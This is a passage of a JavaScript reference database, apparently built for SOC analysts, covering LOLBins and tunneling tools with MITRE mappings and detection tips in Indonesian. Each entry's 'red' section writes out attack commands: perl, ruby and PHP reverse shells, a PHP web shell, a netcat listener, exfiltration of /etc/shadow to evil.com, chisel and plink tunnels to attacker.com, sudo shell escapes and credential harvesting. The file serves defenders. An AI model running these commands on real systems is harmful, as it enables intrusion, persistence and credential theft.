    tips:["Cek target path — system files? Security tools?","Cek /grant Everyone:F (terlalu permissive)","Cek /deny (destructive action)","Cek parent","Korelasi dengan file yang di-modify"],
    detect:"Alert icacls + /grant Everyone atau sensitive path modification.",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Icacls/","https://attack.mitre.org/techniques/T1222/001/"] },

  // ┌──────────────────────────────────────────────┐
  // │        WINDOWS — RECON / DISCOVERY            │
  // └──────────────────────────────────────────────┘
  { n:"netstat.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\netstat.exe",
    d:"Network connection lister", r:"LOW",
    m:["T1049"], mn:["System Network Connections Discovery"], t:["Discovery"],
    tldr:"List network connections — by itself ini benign banget, semua orang pakai netstat. Tapi dalam konteks compromise, attacker pakai ini untuk recon: lihat service apa yang listening, koneksi C2 yang aktif, atau map internal network. Cek siapa yang exec dan dalam konteks apa.",
    abuse:"Network recon — list active connections, find listening services, discover C2 beacons.",
    red:{
      desc:"Recon network state — map koneksi aktif, temukan C2 channel, identify targets.",
      cmds:[
        {c:"netstat -ano", n:"list semua connections + PID — standard recon command"},
        {c:"netstat -anob", n:"list connections + PID + process name — require admin"},
        {c:"netstat -rn", n:"tampilkan routing table — map network segments"},
        {c:"netstat -ano | findstr ESTABLISHED", n:"filter hanya ESTABLISHED connections — lihat active C2"},
        {c:"netstat -ano | findstr :445", n:"cek SMB connections — lateral movement indicator"},
      ]
    },
    legit:"Troubleshoot network, find listening ports.",
    tips:["By itself tidak suspicious, cek konteks","Cek siapa yang exec (user biasa?)","Cek parent process (cmd spawn dari suspicious process?)","Korelasi dengan network events lain","Cek apakah output di-redirect ke file"],
    detect:"Low priority standalone. Korelasikan dengan suspicious process chain.",
    ref:["https://attack.mitre.org/techniques/T1049/"] },

  { n:"ping.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\ping.exe",
    d:"Network connectivity tester", r:"LOW",
    m:["T1016","T1018"], mn:["System Network Configuration Discovery","Remote System Discovery"], t:["Discovery"],
    tldr:"Siapa yang tidak kenal ping. Low risk standalone, tapi dalam automated script post-compromise sering dipakai untuk: network sweep (ping seluruh subnet), C2 connectivity test, atau delay execution (ping -n 30 127.0.0.1 sebagai sleep equivalent). Ping sweep di atas 10 host = suspicious.",
    abuse:"Network sweep (ping subnet), execution delay (ping 127.0.0.1), C2 connectivity check.",
    red:{
      desc:"Host discovery dan network mapping via ICMP.",
      cmds:[
        {c:"for /L %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i >> live_hosts.txt", n:"ping sweep seluruh /24 subnet — host discovery"},
        {c:"ping -n 30 127.0.0.1 > nul", n:"sleep 30 detik equivalent — stalling tactic dalam batch script"},
        {c:"ping -a 10.10.10.10", n:"reverse lookup via ping -a — cek hostname target"},
      ]
    },
    legit:"Network troubleshooting.",
    tips:["Cek ping sweep pattern","Cek ping ke 127.0.0.1 dengan -n tinggi (sleep trick)","Cek parent process","Cek volume — satu ping = fine, 254 ping = suspicious"],
    detect:"Alert ping sweep pattern (>10 unique destinations dalam waktu singkat).",
    ref:["https://attack.mitre.org/techniques/T1018/"] },

  { n:"arp.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\arp.exe",
    d:"ARP table viewer", r:"LOW",
    m:["T1016"], mn:["System Network Configuration Discovery"], t:["Discovery"],
    tldr:"Lihat ARP cache — by itself sangat low risk. Tapi arp -a kasih attacker list host yang recently communicate dengan target, revealing internal network neighbors tanpa perlu scan aktif. Pasif dan quiet, sering dipakai bersamaan dengan ipconfig, netstat, route.",
    abuse:"Passive host discovery via ARP cache — stealth network recon without active scanning.",
    red:{
      desc:"Enumerate recently seen hosts dari ARP cache — stealth discovery.",
      cmds:[
        {c:"arp -a", n:"tampilkan ARP cache — list IP+MAC yang recently communicated"},
        {c:"arp -a | findstr /v incomplete", n:"filter resolved entries — hanya active hosts"},
      ]
    },
    legit:"Network troubleshooting.",
    tips:["By itself tidak suspicious","Cek kombinasi dengan recon tools lain (netstat, ipconfig, nslookup)","Pattern: multiple recon commands dalam waktu dekat = attacker recon phase"],
    detect:"Low standalone. High dalam context multi-tool recon chain.",
    ref:["https://attack.mitre.org/techniques/T1016/"] },

  { n:"vaultcmd.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\vaultcmd.exe",
    d:"Windows Credential Manager vault CLI", r:"HIGH",
    m:["T1555.004"], mn:["Credentials from Password Stores: Windows Credential Manager"], t:["Credential Access"],
    tldr:"CLI untuk Windows Credential Manager — bisa list semua stored credentials (Windows login, network passwords, certificates). Attacker pakai ini untuk harvest saved credentials tanpa butuh tool eksternal. Kalau muncul dengan /listcreds atau /list, investigate user context dan tujuannya.",
    abuse:"List dan harvest stored credentials dari Windows Credential Manager.",
    red:{
      desc:"Credential harvest dari Credential Manager vault — zero external tools needed.",
      cmds:[
        {c:"vaultcmd /list", n:"list semua credential vaults yang ada"},
        {c:"vaultcmd /listcreds:\"Windows Credentials\" /all", n:"list semua Windows credentials (network passwords, etc)"},
        {c:"vaultcmd /listcreds:\"Web Credentials\" /all", n:"list web credentials — browser-saved passwords"},
      ]
    },
    legit:"Credential Manager administration.",
    tips:["Cek /listcreds flag","Cek parent process","Cek user context","Korelasi dengan cmdkey.exe usage"],
    detect:"Alert vaultcmd /listcreds. Sigma: win_susp_vaultcmd.yml",
    ref:["https://attack.mitre.org/techniques/T1555/004/"] },

  { n:"cmdkey.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\cmdkey.exe",
    d:"Windows stored credentials manager", r:"HIGH",
    m:["T1555.004","T1078"], mn:["Credentials from Password Stores","Valid Accounts"], t:["Credential Access","Persistence"],
    tldr:"Manage stored credentials dari command line. Attacker bisa /list untuk enumeration, tapi yang lebih bahaya: /add untuk tambah fake credentials atau /add untuk simpan harvested creds buat lateral movement pakai runas. Sering dipakai bersamaan dengan runas /savecred.",
    abuse:"List stored credentials, add credentials for lateral movement via runas /savecred.",
    red:{
      desc:"Enumerate dan manipulate stored credentials untuk lateral movement.",
      cmds:[
        {c:"cmdkey /list", n:"list semua stored credentials — enumerate target"},
        {c:"cmdkey /add:TARGET /user:admin /pass:password", n:"tambah credentials ke store — prep untuk runas /savecred"},
        {c:"runas /savecred /user:DOMAIN\\admin cmd.exe", n:"spawn shell sebagai admin menggunakan stored credentials"},
        {c:"cmdkey /delete:TARGET", n:"hapus credentials setelah dipakai — cover tracks"},
      ]
    },
    legit:"Manage Windows stored credentials.",
    tips:["Cek /list (enum)","Cek /add dengan credentials (staging)","Korelasi dengan runas /savecred","Cek /delete setelah usage (cover tracks)","Cek parent process"],
    detect:"Alert cmdkey /list atau /add. Alert cmdkey + runas /savecred chain.",
    ref:["https://attack.mitre.org/techniques/T1555/004/"] },

  // ┌──────────────────────────────────────────────┐
  // │        LINUX / CROSS — SCRIPTING              │
  // └──────────────────────────────────────────────┘
  { n:"perl", c:"interpreter", os:"linux", p:"/usr/bin/perl",
    d:"Perl scripting language interpreter", r:"HIGH",
    m:["T1059.006","T1059"], mn:["Command and Scripting Interpreter"], t:["Execution","Defense Evasion"],
    tldr:"Perl ada di hampir semua Linux system dan sering dipakai untuk GTFOBins — escape shell restrictions, privilege escalation, reverse shells. Attacker favoritkan perl karena sudah tersedia dan jarang di-block. 'perl -e' = inline code exec = investigate.",
    abuse:"Shell escape, reverse shell, privilege escalation via GTFOBins, SUID abuse.",
    red:{
      desc:"Arbitrary code execution via Perl interpreter — available secara default di hampir semua Linux.",
      cmds:[
        {c:"perl -e 'use Socket;$i=\"10.10.10.10\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", n:"perl reverse shell — fully functional interactive shell"},
        {c:"perl -e 'exec \"/bin/bash\";'", n:"GTFOBins shell escape — bypass restricted shell"},
        {c:"sudo perl -e 'exec \"/bin/bash\";'", n:"priv esc via sudo perl jika diizinkan di sudoers"},
        {c:"perl -e 'system(\"chmod u+s /bin/bash\")'", n:"SUID bit set via perl"},
      ]
    },
    legit:"Text processing, system admin scripts, web applications (CGI).",
    tips:["Cek -e flag (inline exec)","Cek apakah network connection post-exec","Cek parent process","Cek user context (sudo?)","Cek apakah ada SUID binary created"],
    detect:"Alert perl -e dengan network-related content. Alert sudo perl.",
    ref:["https://gtfobins.github.io/gtfobins/perl/","https://attack.mitre.org/techniques/T1059/"] },

  { n:"ruby", c:"interpreter", os:"linux", p:"/usr/bin/ruby",
    d:"Ruby scripting language interpreter", r:"HIGH",
    m:["T1059"], mn:["Command and Scripting Interpreter"], t:["Execution","Defense Evasion"],
    tldr:"Sama kayak python dan perl — kalau ada di sistem, bisa jadi attack vector. Ruby GTFOBins sangat straightforward: ruby -e 'exec \"/bin/sh\"' cukup untuk shell escape. Kalau ada di server environment (Rails app), kemungkinan besar tersedia.",
    abuse:"Shell escape, reverse shell, SUID abuse via GTFOBins.",
    red:{
      desc:"Arbitrary code execution via Ruby interpreter.",
      cmds:[
        {c:"ruby -e 'exec \"/bin/bash\"'", n:"shell escape via GTFOBins"},
        {c:"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"10.10.10.10\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'", n:"ruby reverse shell"},
        {c:"sudo ruby -e 'exec \"/bin/bash\"'", n:"priv esc via sudo ruby"},
      ]
    },
    legit:"Web development (Rails), scripting.",
    tips:["Cek -e flag","Cek network connections","Cek sudo context","Jarang dipakai langsung di CLI dalam normal ops"],
    detect:"Alert ruby -e dengan network content. Alert sudo ruby.",
    ref:["https://gtfobins.github.io/gtfobins/ruby/","https://attack.mitre.org/techniques/T1059/"] },

  { n:"php", c:"interpreter", os:"linux", p:"/usr/bin/php",
    d:"PHP scripting language interpreter", r:"HIGH",
    m:["T1059"], mn:["Command and Scripting Interpreter"], t:["Execution","Defense Evasion"],
    tldr:"PHP CLI sering tersedia di web servers dan bisa dipakai untuk shell escape dan reverse shell langsung dari terminal. PHP web shell adalah salah satu initial access favorit — kalau PHP exec dari path web server, itu web shell activity.",
    abuse:"Web shell, reverse shell, command execution, shell escape.",
    red:{
      desc:"Arbitrary code execution via PHP CLI atau web shell.",
      cmds:[
        {c:"php -r 'system(\"/bin/bash\");'", n:"shell escape via GTFOBins"},
        {c:"php -r '$sock=fsockopen(\"10.10.10.10\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", n:"PHP reverse shell CLI"},
        {c:"echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php", n:"drop web shell ke webroot"},
        {c:"php -r 'passthru(\"id; whoami; uname -a\");'", n:"command execution via passthru"},
      ]
    },
    legit:"Web development, CLI scripting.",
    tips:["Cek -r flag (inline exec)","Cek jika exec dari web server process (apache, nginx parent)","Cek network connections","Cek file creation di webroot","Cek web access logs untuk web shell patterns"],
    detect:"Alert php -r dari suspicious parent. Alert PHP web shell patterns.",
    ref:["https://gtfobins.github.io/gtfobins/php/","https://attack.mitre.org/techniques/T1059/"] },

  { n:"awk", c:"lolbin", os:"linux", p:"/usr/bin/awk",
    d:"Text processing and pattern scanning tool", r:"MEDIUM",
    m:["T1059"], mn:["Command and Scripting Interpreter"], t:["Execution","Defense Evasion"],
    tldr:"Text processor yang ada di SETIAP Linux — attacker pakai untuk shell escape via GTFOBins. 'awk BEGIN{system(\"/bin/sh\")}' cukup untuk dapat shell. Standalone low risk, tapi dalam konteks privilege escalation atau sudo bypass, ini powerful.",
    abuse:"Shell escape via GTFOBins, privilege escalation via sudo awk.",
    red:{
      desc:"Shell escape dan code execution via awk interpreter.",
      cmds:[
        {c:"awk 'BEGIN {system(\"/bin/bash\")}'", n:"shell escape — GTFOBins classic"},
        {c:"sudo awk 'BEGIN {system(\"/bin/bash\")}'", n:"priv esc via sudo awk — jika diizinkan sudoers"},
        {c:"awk 'BEGIN {cmd=\"/bin/bash\"; system(cmd)}'", n:"variant shell escape"},
      ]
    },
    legit:"Text processing, log analysis, data transformation.",
    tips:["Cek system() call dalam awk script","Cek sudo context","Cek parent process","Standalone normal usage tidak suspicious"],
    detect:"Alert sudo awk dengan system() call. Alert awk dalam suspicious process chain.",
    ref:["https://gtfobins.github.io/gtfobins/awk/"] },

  { n:"base64", c:"lolbin", os:"linux", p:"/usr/bin/base64",
    d:"Base64 encode/decode utility", r:"MEDIUM",
    m:["T1027","T1140"], mn:["Obfuscated Files or Information","Deobfuscate/Decode Files"], t:["Defense Evasion"],
    tldr:"Encode/decode base64 — sering dipakai dalam payload delivery dan data exfiltration. Attacker encode command atau binary untuk bypass content inspection, lalu decode dan exec di target. Kombinasi echo ... | base64 -d | bash adalah classic one-liner dropper.",
    abuse:"Obfuscate payloads, decode stager, exfiltrate data encoded as base64.",
    red:{
      desc:"Payload obfuscation dan staged execution.",
      cmds:[
        {c:"echo <BASE64_PAYLOAD> | base64 -d | bash", n:"decode dan langsung pipe ke bash — fileless stager classic"},
        {c:"base64 -d encoded.txt > payload.sh && chmod +x payload.sh && ./payload.sh", n:"decode ke file, chmod, exec"},
        {c:"cat /etc/shadow | base64 | curl -d @- http://evil.com/exfil", n:"encode sensitive file + exfil via curl"},
        {c:"base64 /bin/bash > /tmp/encoded_bash", n:"encode binary untuk exfil atau bypass filter"},
      ]
    },
    legit:"Data encoding, certificate handling, data transfer.",
    tips:["Cek kombinasi: base64 -d + bash/sh pipe","Cek exfiltration pattern: sensitive file + base64 + curl/wget","Cek base64 dalam powershell equivalent: base64 -d | python","Standalone tidak suspicious, cek konteks"],
    detect:"Alert base64 -d pipe ke bash/sh. Alert base64 dengan sensitive file (shadow, passwd).",
    ref:["https://gtfobins.github.io/gtfobins/base64/","https://attack.mitre.org/techniques/T1027/"] },

  { n:"strace", c:"system", os:"linux", p:"/usr/bin/strace",
    d:"System call tracer", r:"MEDIUM",
    m:["T1003","T1057"], mn:["OS Credential Dumping","Process Discovery"], t:["Credential Access","Discovery"],
    tldr:"Debug tool yang trace system calls — attacker pakai untuk intercept credentials yang muncul di syscalls (kayak read() dari password input), atau sebagai sudo vector (sudo strace program = exec sebagai root). Jarang dipakai user biasa.",
    abuse:"Credential interception via syscall tracing, shell escape via sudo strace.",
    red:{
      desc:"Intercept credentials dan privilege escalation via strace.",
      cmds:[
        {c:"strace -e read -p <PID_ssh> 2>&1 | grep password", n:"intercept SSH password melalui read() syscalls"},
        {c:"sudo strace /bin/bash", n:"exec bash sebagai root via sudo strace"},
        {c:"strace -o /tmp/trace.log -f program", n:"trace semua syscalls + fork — dump ke file untuk analysis"},
        {c:"strace -p <PID> -s 1024 -e trace=read,write 2>&1", n:"trace read/write dari running process — credential interception"},
      ]
    },
    legit:"Debugging, troubleshooting applications.",
    tips:["Cek -p flag (attach ke existing process)","Cek target PID — attach ke apa?","Cek sudo strace","Cek output file sensitive content","Jarang dipakai di production"],
    detect:"Alert strace -p pada sensitive processes. Alert sudo strace.",
    ref:["https://gtfobins.github.io/gtfobins/strace/","https://attack.mitre.org/techniques/T1003/"] },

  { n:"screen", c:"lolbin", os:"linux", p:"/usr/bin/screen",
    d:"Terminal multiplexer", r:"HIGH",
    m:["T1059","T1548.001"], mn:["Command and Scripting Interpreter","SUID and SGID"], t:["Execution","Privilege Escalation"],
    tldr:"Terminal multiplexer yang kadang punya SUID bit (versi lama) — ini klasik privilege escalation vector. Bahkan tanpa SUID, screen bisa dipakai untuk detach session yang persist setelah logout (attacker backdoor lingkungan), atau shell escape via -x flag.",
    abuse:"SUID-based privilege escalation, persistent backdoor sessions, shell escape.",
    red:{
      desc:"Priv esc via SUID screen, persistent backdoor via detached sessions.",
      cmds:[
        {c:"screen -x", n:"attach ke existing screen session — bisa ambil alih admin session"},
        {c:"/usr/bin/screen -ls", n:"list semua active screen sessions — cek siapa yang ada session"},
        {c:"screen -dmS backdoor /bin/bash", n:"buat detached screen session bernama 'backdoor' — persist tanpa user logon"},
        {c:"screen --version && find / -perm -4000 -name screen 2>/dev/null", n:"cek versi + cari SUID screen binary"},
      ]
    },
    legit:"Terminal multiplexing, long-running remote sessions.",
    tips:["Cek apakah screen punya SUID bit","Cek screen -dmS sessions yang suspicious","Cek -x (attach ke session orang lain)","List screen sessions reguler"],
    detect:"Alert screen dengan SUID. Alert screen -dmS dari non-admin user.",
    ref:["https://gtfobins.github.io/gtfobins/screen/","https://attack.mitre.org/techniques/T1548/001/"] },

  { n:"nohup", c:"lolbin", os:"linux", p:"/usr/bin/nohup",
    d:"Run command immune to hangups", r:"MEDIUM",
    m:["T1059","T1543"], mn:["Command and Scripting Interpreter","Create or Modify System Process"], t:["Execution","Persistence"],
    tldr:"Jalankan command yang tetap jalan setelah user logout — classic persistence trick. Attacker pakai nohup untuk jalankan reverse shell atau C2 beacon yang tidak mati ketika SSH session disconnect. Sering dipakai bersamaan dengan & (background) dan output redirect.",
    abuse:"Persistent process execution that survives logout, daemonize malicious processes.",
    red:{
      desc:"Jalankan malicious process yang persist setelah session terminated.",
      cmds:[
        {c:"nohup /tmp/beacon.sh > /dev/null 2>&1 &", n:"jalankan beacon sebagai background process, redirect output ke /dev/null — stealth"},
        {c:"nohup python3 -c 'import pty;pty.spawn(\"/bin/bash\")' &", n:"persistent python shell via nohup"},
        {c:"nohup nc -lvp 4444 -e /bin/bash &", n:"persistent netcat listener yang survive logout"},
      ]
    },
    legit:"Run long jobs without SSH session dependency.",
    tips:["Cek binary yang di-exec via nohup","Cek output redirect ke /dev/null (hiding)","Cek apakah run dari Temp/suspicious path","Cek parent process"],
    detect:"Alert nohup + binary dari /tmp, /dev/shm, atau suspicious path.",
    ref:["https://gtfobins.github.io/gtfobins/nohup/","https://attack.mitre.org/techniques/T1059/"] },

  { n:"env", c:"lolbin", os:"linux", p:"/usr/bin/env",
    d:"Run program in modified environment", r:"HIGH",
    m:["T1059","T1548.001"], mn:["Command and Scripting Interpreter","SUID and SGID"], t:["Execution","Defense Evasion","Privilege Escalation"],
    tldr:"GTFOBins simple banget: env /bin/sh = instant shell. Lebih powerful: kalau env punya SUID atau ada di sudoers, bisa instant root. Sering dipakai untuk escape restricted shell atau bypass sudo restrictions di misconfigured systems.",
    abuse:"Shell escape, SUID/sudo-based privilege escalation.",
    red:{
      desc:"Instant shell via env, privilege escalation via sudo/SUID env.",
      cmds:[
        {c:"env /bin/sh", n:"shell escape — GTFOBins classic, bypass restricted environment"},
        {c:"sudo env /bin/bash", n:"priv esc via sudo env jika diizinkan sudoers"},
        {c:"env -i /bin/bash --noprofile --norc", n:"clean bash session — reset environment variables, bypass profil-based restrictions"},
        {c:"find / -perm -4000 -name env 2>/dev/null", n:"cari SUID env binary"},
      ]
    },
    legit:"Set environment variables for program execution.",
    tips:["Cek sudo env","Cek SUID bit pada env binary","Cek env /bin/sh atau /bin/bash argument","Low risk standalone, high risk dalam sudo context"],
    detect:"Alert sudo env. Alert SUID env execution.",
    ref:["https://gtfobins.github.io/gtfobins/env/","https://attack.mitre.org/techniques/T1548/001/"] },

  // ┌──────────────────────────────────────────────┐
  // │        TUNNELING / C2 TOOLS                   │
  // └──────────────────────────────────────────────┘
  { n:"chisel", c:"tunnel", os:"cross", p:"/usr/local/bin/chisel (linux) / chisel.exe (win)",
    d:"TCP/UDP tunnel over HTTP/WebSocket", r:"CRITICAL",
    m:["T1572","T1090"], mn:["Protocol Tunneling","Proxy"], t:["Command and Control"],
    tldr:"Tool khusus tunneling — tidak ada use case legitimate di enterprise environment. Kalau ini muncul di alert atau filesystem, hampir 100% attacker pakai untuk bypass firewall, akses internal network dari luar, atau setup SOCKS proxy untuk lateral movement. Priority investigate.",
    chain:{ stage:"Command and Control", flows:["initial access → chisel server (C2) → chisel client (victim) → SOCKS proxy → lateral movement"] },
    abuse:"HTTP/WebSocket tunnel bypass firewall, SOCKS proxy for lateral movement, C2 channel via web ports.",
    red:{
      desc:"Establish C2 tunnel yang tampak seperti normal HTTP/HTTPS traffic, bypass network controls.",
      cmds:[
        {c:"chisel server -p 8080 --reverse", n:"start chisel server (attacker-controlled) — reverse mode untuk terima client connections"},
        {c:"chisel client http://attacker.com:8080 R:socks", n:"connect dari victim ke server + buka SOCKS5 proxy di server — full internal network access"},
        {c:"chisel client http://attacker.com:8080 R:8888:127.0.0.1:8888", n:"forward specific port — expose internal service ke attacker"},
        {c:"chisel client https://attacker.com:443 R:socks --fingerprint abc123", n:"via HTTPS (port 443) + certificate pinning — evade detection"},
      ]
    },
    legit:"Tidak ada di enterprise. Development/lab use only.",
    tips:["Cek binary hash — chisel dikenal hash-nya","Cek network connections ke external IP via HTTP port","Cek parent process — siapa yang drop/exec?","Cek apakah ada SOCKS proxy behavior setelahnya","Cek DNS resolution mencurigakan","Immediate response: block + isolate"],
    detect:"Alert chisel binary presence. Alert unusual HTTP tunneling behavior. Threat hunting: hash-based.",
    ref:["https://attack.mitre.org/techniques/T1572/"] },

  { n:"plink.exe", c:"tunnel", os:"win", p:"C:\\Users\\*\\plink.exe (dropped)",
    d:"PuTTY command-line SSH client", r:"HIGH",
    m:["T1572","T1021.004"], mn:["Protocol Tunneling","SSH"], t:["Command and Control","Lateral Movement"],
    tldr:"CLI version dari PuTTY SSH client — legitimate tool tapi favorit attacker buat SSH tunneling dari Windows ke Linux C2. Bisa create local/remote port forward yang bypass firewall. Kalau ditemukan di path yang bukan instalasi PuTTY yang proper (Temp, AppData), curiga.",
    abuse:"SSH tunneling dari Windows, port forwarding, create backdoor SSH session.",
    red:{
      desc:"SSH reverse tunnel dari Windows endpoint ke attacker C2.",
      cmds:[
        {c:"plink.exe -ssh user@attacker.com -R 4444:127.0.0.1:3389 -pw password", n:"reverse SSH tunnel — expose RDP (3389) victim ke attacker port 4444"},
        {c:"plink.exe -ssh user@attacker.com -D 8080 -pw password", n:"dynamic SOCKS proxy via SSH — lateral movement channel"},
        {c:"plink.exe -N -R 80:127.0.0.1:80 user@attacker.com", n:"-N = no command, -R = remote forward — pure tunnel, no interactive"},
        {c:"plink.exe -batch -pw password user@attacker.com \"cat /etc/passwd\"", n:"exec remote command via SSH — non-interactive"},
      ]
    },
    legit:"SSH dari Windows ke Linux servers.",
    tips:["Cek path — bukan di Program Files PuTTY?","Cek -R flag (reverse tunnel)","Cek -D flag (SOCKS proxy)","Cek destination IP/hostname","Cek parent process","Cek -pw flag (password hardcoded di cmdline)"],
    detect:"Alert plink.exe di non-standard path. Alert plink.exe -R atau -D flag.",
    ref:["https://attack.mitre.org/techniques/T1572/"] },

  { n:"ngrok", c:"tunnel", os:"cross", p:"/usr/local/bin/ngrok (linux) / ngrok.exe (win)",
    d:"Expose local services via secure tunnels", r:"CRITICAL",
    m:["T1572","T1090.002"], mn:["Protocol Tunneling","External Proxy"], t:["Command and Control"],
    tldr:"Ngrok expose local port ke internet via ngrok.com infrastructure — legitimate buat developer, tapi attacker pakai ini buat instant C2 channel yang bypass egress filtering (traffic keluar ke ngrok.com = whitelisted di banyak env). Kalau muncul di endpoint bukan dev machine, red flag.",
    abuse:"Instant C2 channel via ngrok.com tunnel, bypass egress firewall.",
    red:{
      desc:"Expose local C2 listener atau internal services ke internet via ngrok cloud infrastructure.",
      cmds:[
        {c:"ngrok tcp 4444", n:"expose local TCP port 4444 (Metasploit listener) ke public ngrok URL"},
        {c:"ngrok http 8080", n:"expose local HTTP service — exfiltrate data via apparent web traffic"},
        {c:"ngrok tcp 22", n:"expose SSH port ke internet via ngrok — persistent SSH backdoor"},
        {c:"ngrok start --config ngrok.yml --all", n:"start semua tunnels dari config file — might include multiple backdoors"},
      ]
    },
    legit:"Developer tool untuk webhook testing, demo local apps.",
    tips:["Cek binary di endpoint non-dev","Cek network connections ke *.ngrok.io atau *.ngrok-free.app","Cek port yang di-expose","Cek parent process","Cek apakah ngrok sudah di-authenticate (akun attacker)","Block ngrok domains di proxy/DNS kalau tidak dibutuhkan"],
    detect:"Alert ngrok binary. Block *.ngrok.io di DNS/proxy. Alert network connections ke ngrok infrastructure.",
    ref:["https://attack.mitre.org/techniques/T1572/"] },

  // ┌──────────────────────────────────────────────┐
  // │        WINDOWS — CREDENTIAL / RECON           │
  // └──────────────────────────────────────────────┘
  { n:"whoami.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\whoami.exe",
    d:"Current user identity info", r:"LOW",
    m:["T1033"], mn:["System Owner/User Discovery"], t:["Discovery"],
    tldr:"Cek identity current user — standalone sangat benign. Tapi 'whoami /all' adalah cara attacker verify privilege setelah exploit: dapat token info, group membership, privilege list. Kalau muncul post-exploit atau dari unexpected parent, ini discovery phase.",
    abuse:"Post-exploitation privilege verification, enumerate user tokens and groups.",
    red:{
      desc:"Verify current privilege level dan group membership post-exploit.",
      cmds:[
        {c:"whoami /all", n:"dump semua info: username, SID, group memberships, privileges — privilege check post-exploit"},
        {c:"whoami /priv", n:"list semua token privileges — cek SeDebugPrivilege, SeImpersonatePrivilege untuk priv esc"},
        {c:"whoami /groups", n:"list group membership — verify domain admin?"},
        {c:"whoami /fo list", n:"output dalam format list — scripting-friendly"},
      ]
    },
    legit:"Verify identity, troubleshoot permission issues.",
    tips:["Standalone very low risk","Cek konteks — muncul setelah exploit?","Cek parent process (cmd spawn dari malware?)","Cek /all atau /priv flags (deep privilege check)","Korelasi dengan discovery phase activity lain"],
    detect:"Low standalone. Korelasikan dengan post-exploitation chain.",
    ref:["https://attack.mitre.org/techniques/T1033/"] },

  { n:"tasklist.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\tasklist.exe",
    d:"List running processes", r:"LOW",
    m:["T1057"], mn:["Process Discovery"], t:["Discovery"],
    tldr:"List running processes — benign standalone, attacker pakai untuk recon: identify security tools (AV, EDR), find target process untuk injection, verify C2 beacon berjalan. Kalau muncul dari suspicious parent atau dengan filter spesifik, cek konteks.",
    abuse:"Security tool discovery, process injection targeting, verify malware execution.",
    red:{
      desc:"Enumerate running processes untuk target selection dan security tool discovery.",
      cmds:[
        {c:"tasklist /fo csv /nh", n:"list processes dalam CSV format — easy parsing untuk script"},
        {c:"tasklist /svc", n:"list processes beserta services — identify security services"},
        {c:"tasklist | findstr -i /c:defender /c:crowdstrike /c:cylance /c:sentinel", n:"cek apakah EDR/AV aktif — pre-attack recon"},
        {c:"tasklist /fi \"USERNAME eq SYSTEM\"", n:"filter proses yang run sebagai SYSTEM — target untuk token impersonation"},
      ]
    },
    legit:"Process troubleshooting, system monitoring.",
    tips:["Cek filter patterns — cari AV/EDR names?","Cek /fo csv (scripted parsing)","Cek parent process","Standalone low risk, high in context"],
    detect:"Alert tasklist dengan AV/EDR name filter. Korelasikan dengan post-exploitation activity.",
    ref:["https://attack.mitre.org/techniques/T1057/"] },

];

export default DB;
